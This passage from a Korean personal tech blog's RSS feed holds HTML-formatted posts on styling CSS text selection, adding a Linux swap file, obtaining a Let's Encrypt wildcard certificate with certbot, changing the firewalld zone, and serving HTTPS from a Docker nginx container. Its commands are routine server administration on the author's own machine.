  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;upper&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[CSS 블록 지정 색]]></title><description><![CDATA[텍스트를 드래그 했을 때 기본적으로 파란 배경에 하얀 글씨로 변경된다. 이 효과를 변경하기 위해서는 와 선택자를 사용하여 변경할 수 있다. 기본적인 CSS이기 때문에 글자 효과 말고 다른 효과도 줄 수 있다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 20 Feb 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;텍스트를 드래그 했을 때 기본적으로 파란 배경에 하얀 글씨로 변경된다.&lt;/p&gt;
&lt;p&gt;이 효과를 변경하기 위해서는 &lt;code class=&quot;language-text&quot;&gt;-moz-selection&lt;/code&gt;와 &lt;code class=&quot;language-text&quot;&gt;selection&lt;/code&gt;선택자를 사용하여 변경할 수 있다.&lt;/p&gt;
&lt;p&gt;기본적인 CSS이기 때문에 글자 효과 말고 다른 효과도 줄 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;css&quot;&gt;&lt;pre class=&quot;language-css&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/* Code for Firefox */&lt;/span&gt;
&lt;span class=&quot;token selector&quot;&gt;::-moz-selection&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; red&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; yellow&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token selector&quot;&gt;::selection&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; red&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; yellow&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Linux swap 파일 추가]]></title><description><![CDATA[서버 자원에서 메모리가 부족할 경우 Swap 기능을 이용하여 추가해 줄 수 있습니다. Swap의 경우 스토리지를 사용하기 때문에 메모리에 비하여 성능이 좋지 않기 때문에 성능이 중요한 경우에는 메모리를 확장하는 것이 좋은 선택입니다. 우선 Swap…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 15 Feb 2019 04:00:00 GMT</pubDate><content:encoded>&lt;p&gt;서버 자원에서 메모리가 부족할 경우 Swap 기능을 이용하여 추가해 줄 수 있습니다.&lt;/p&gt;
&lt;p&gt;Swap의 경우 &lt;strong&gt;스토리지&lt;/strong&gt;를 사용하기 때문에 메모리에 비하여 성능이 좋지 않기 때문에 성능이 중요한 경우에는 메모리를 확장하는 것이 좋은 선택입니다.&lt;/p&gt;
&lt;p&gt;우선 Swap 메모리로 사용할 파일을 생성합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com /&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# fallocate -l 4G /swap&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;CentOS7의 경우 에러가 발생하기 때문에 &lt;code class=&quot;language-text&quot;&gt;dd&lt;/code&gt;를 이용하여 초기화를 해주어야 합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com /&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# dd if=/dev/zero of=/swap count=2048 bs=1MiB&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;2048&lt;/span&gt;+0 records &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;2048&lt;/span&gt;+0 records out
&lt;span class=&quot;token number&quot;&gt;2147483648&lt;/span&gt; bytes &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2.1&lt;/span&gt; GB&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; copied, &lt;span class=&quot;token number&quot;&gt;55.8261&lt;/span&gt; s, &lt;span class=&quot;token number&quot;&gt;38.5&lt;/span&gt; MB/s&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;만들어진 파일을 swap형식으로 만들고 등록해줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com /&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# chmod 0600 /swap&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com /&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# mkswap /swap&lt;/span&gt;
Setting up swapspace version &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;, size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2097148&lt;/span&gt; KiB
no label, &lt;span class=&quot;token assign-left variable&quot;&gt;UUID&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;567f0de3-4556-402d-b742-e1507288de58
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com /&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# swapon /swap&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;적용이 잘 되었네요 ㅎㅎ&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com /&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# swapon -s&lt;/span&gt;
Filename                                Type            Size    Used    Priority
/swap                                   &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;2097148&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;       -2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;하지만 재시작을 할 경우에는 다시 적용해 주어야 하기 때문에, 이를 &lt;code class=&quot;language-text&quot;&gt;/etc/fstab&lt;/code&gt;에 추가해줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com /&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cat /etc/fstab&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;# /etc/fstab&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;# Created by anaconda on Wed Feb 13 19:23:27 2019&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;# Accessible filesystems, by reference, are maintained under &apos;/dev/disk&apos;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;UUID&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;9adfe2b4-b4b7-454f-8d7a-4193208d0ea7 /               xfs     defaults        &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;# Swap&lt;/span&gt;
/swap                                     swap            swap    defaults        &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Let's Encrypt wildcard 인증서]]></title><description><![CDATA[우선 letsencrypt툴을 설치해줍니다. 사용하고자 하는 도메인을 입력하여 wildcard인증서를 만들어 줍니다. 동의를 하지 않을 경우 진행할 수 없습니다. 다음으로 넘어가면 DNS설정에서 값을 추가해 주어야 합니다. DNS…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 15 Feb 2019 03:00:00 GMT</pubDate><content:encoded>&lt;p&gt;우선 letsencrypt툴을 설치해줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# yum install certbot&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;사용하고자 하는 도메인을 입력하여 wildcard인증서를 만들어 줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# certbot certonly --manual -d *.micalgenus.com -d micalgenus.com --preferred-challenges dns-01 --server https://acme-v02.api.letsencrypt.org/directory&lt;/span&gt;
Starting new HTTPS connection &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;: supporters.eff.org
Obtaining a new certificate
Performing the following challenges:
dns-01 challenge &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; micalgenus.com
dns-01 challenge &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; micalgenus.com
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
NOTE: The IP of this machine will be publicly logged as having requested this
certificate. If you&lt;span class=&quot;token string&quot;&gt;&apos;re running certbot in manual mode on a machine that is not
your server, please ensure you&apos;&lt;/span&gt;re okay with that.
Are you OK with your IP being logged?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Y&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;es/&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;N&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;o: y&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;동의를 하지 않을 경우 진행할 수 없습니다.&lt;/p&gt;
&lt;p&gt;다음으로 넘어가면 DNS설정에서 값을 추가해 주어야 합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please deploy a DNS TXT record under the name
_acme-challenge.micalgenus.com with the following value:

HzvGQRCEQvf6TzyDgJpttZN4nI10EHV46asfbTCJM5I

Before continuing, verify the record is deployed.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Press Enter to Continue
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please deploy a DNS TXT record under the name
_acme-challenge.micalgenus.com with the following value:

vckTZpSo0Eh7wqPhWFW5-Tv-Wo01G6KkpBu4UF9i_SE

Before continuing, verify the record is deployed.
&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;This must be &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; up &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; addition to the previous challenges&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt; not remove,
replace, or undo the previous challenge tasks yet. Note that you might be
asked to create multiple distinct TXT records with the same name. This is
permitted by DNS standards.&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Press Enter to Continue&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;DNS를 설정해주는 곳에 가서 두 값을 추가해 주어야 합니다.&lt;/p&gt;
&lt;p&gt;저의 경우는 &lt;code class=&quot;language-text&quot;&gt;cloudflare&lt;/code&gt;를 사용하기 때문에 다음과 같이 필드를 추가하였습니다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/2019-02/Let-s-Encrypt-wildcard-certification/img1.png&quot; alt=&quot;img1&quot;&gt;&lt;/p&gt;
&lt;p&gt;값을 모두 추가하였을 경우 엔터를 눌러 진행을 하면 됩니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;Waiting &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; verification&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
Cleaning up challenges
Resetting dropped connection: acme-v02.api.letsencrypt.org
IMPORTANT NOTES:
 - Congratulations&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt; Your certificate and chain have been saved at:
   /etc/letsencrypt/live/micalgenus.com/fullchain.pem
   Your key &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; has been saved at:
   /etc/letsencrypt/live/micalgenus.com/privkey.pem
   Your cert will expire on &lt;span class=&quot;token number&quot;&gt;2019&lt;/span&gt;-05-16. To obtain a new or tweaked
   version of this certificate &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; the future, simply run certbot
   again. To non-interactively renew *all* of your certificates, run
   &lt;span class=&quot;token string&quot;&gt;&quot;certbot renew&quot;&lt;/span&gt;
 - Your account credentials have been saved &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; your Certbot
   configuration directory at /etc/letsencrypt. You should &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt; a
   secure backup of this folder now. This configuration directory will
   also contain certificates and private keys obtained by Certbot so
   making regular backups of this folder is ideal.
 - If you like Certbot, please consider supporting our work by:
   Donating to ISRG / Let&apos;s Encrypt:   https://letsencrypt.org/donate
   Donating to EFF:                    https://eff.org/donate-le&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;인증서 파일이 생성이 되면 해당 경로에 인증서가 생기게 됩니다. letsencrypt의 인증서 유효기간은 &lt;code class=&quot;language-text&quot;&gt;90&lt;/code&gt;일이기 때문에 자주 갱신을 해주어야 합니다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Firewalld zone 변경]]></title><description><![CDATA[firewalld의 zone을 변경하기전, 우선 현재 사용중인 zone을 확인합니다. —set-default-zone옵션을 사용하여 변경합니다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 15 Feb 2019 02:00:00 GMT</pubDate><content:encoded>&lt;p&gt;firewalld의 zone을 변경하기전, 우선 현재 사용중인 zone을 확인합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# firewall-cmd --get-default-zone&lt;/span&gt;
trusted
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# firewall-cmd --get-zones&lt;/span&gt;
block dmz drop external home internal public trusted work&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;—set-default-zone옵션을 사용하여 변경합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# firewall-cmd --set-default-zone=public&lt;/span&gt;
success
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# firewall-cmd --get-default-zone&lt;/span&gt;
public&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Docker Nginx Letsencrypt SSL 인증서 적용]]></title><description><![CDATA[Docker nginx 설치에서 만들어진 컨테이너에 인증서로 HTTPS를 사용하겠습니다. 저는 미리 만들어둔 인증서를 사용하였습니다. CentOS의 경우 selinux를 위해 context…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 15 Feb 2019 01:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;/articles/2019-02/install-nginx-in-docker&quot;&gt;Docker nginx 설치&lt;/a&gt;에서 만들어진 컨테이너에 &lt;code class=&quot;language-text&quot;&gt;Lets&apos;encrypt&lt;/code&gt;인증서로 HTTPS를 사용하겠습니다.&lt;/p&gt;
&lt;p&gt;저는 미리 만들어둔 인증서를 사용하였습니다.&lt;/p&gt;
&lt;p&gt;CentOS의 경우 selinux를 위해 context를 변경해줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# chcon -R -u system_u -t svirt_sandbox_file_t /etc/letsencrypt/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그 후 인증서 파일을 마운트 시켜줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cat /etc/systemd/system/nginx.service&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Unit&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;Nginx Container
&lt;span class=&quot;token assign-left variable&quot;&gt;After&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;docker.service
&lt;span class=&quot;token assign-left variable&quot;&gt;Requires&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;docker.service

&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Service&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;TimeoutStartSec&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;Restart&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;always
&lt;span class=&quot;token assign-left variable&quot;&gt;ExecStartPre&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/bin/docker pull nginx:latest
&lt;span class=&quot;token assign-left variable&quot;&gt;ExecStart&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/bin/docker run --name nginx -p &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;:80 -p &lt;span class=&quot;token number&quot;&gt;443&lt;/span&gt;:443 -v /etc/letsencrypt:/etc/letsencrypt -v /etc/nginx:/etc/nginx -v /var/log/nginx:/var/log/nginx nginx:latest
&lt;span class=&quot;token assign-left variable&quot;&gt;ExecStop&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/bin/docker stop -t &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; nginx
&lt;span class=&quot;token assign-left variable&quot;&gt;ExecStopPost&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/bin/docker &lt;span class=&quot;token function&quot;&gt;rm&lt;/span&gt; -f nginx

&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Install&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;WantedBy&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;multi-user.target
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;컨테이너를 다시 실행해 줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# systemctl daemon-reload&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# systemctl restart nginx&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;virtual host&lt;/code&gt;를 사용하여 인증서를 확인하기 위해 디렉토리를 만듭니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cd /etc/nginx&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com nginx&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# mkdir sites-enabled sites-available&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그 후 해당 디렉토리를 설정에 추가해 줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cat /etc/nginx/nginx.conf&lt;/span&gt;
user  nginx&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
worker_processes  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
error_log  /var/log/nginx/error.log warn&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
pid        /var/run/nginx.pid&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
events &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    worker_connections  &lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
http &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    include       /etc/nginx/mime.types&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    default_type  application/octet-stream&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    log_format  main  &lt;span class=&quot;token string&quot;&gt;&apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;&lt;/span&gt;
                      &lt;span class=&quot;token string&quot;&gt;&apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;&lt;/span&gt;
                      &lt;span class=&quot;token string&quot;&gt;&apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    access_log  /var/log/nginx/access.log  main&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    sendfile        on&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;#tcp_nopush     on;&lt;/span&gt;
    keepalive_timeout  &lt;span class=&quot;token number&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;#gzip  on;&lt;/span&gt;
    include /etc/nginx/conf.d/*.conf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    include /etc/nginx/sites-enabled/*.conf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이제 SSL 설정을 추가해보겠습니다.&lt;/p&gt;
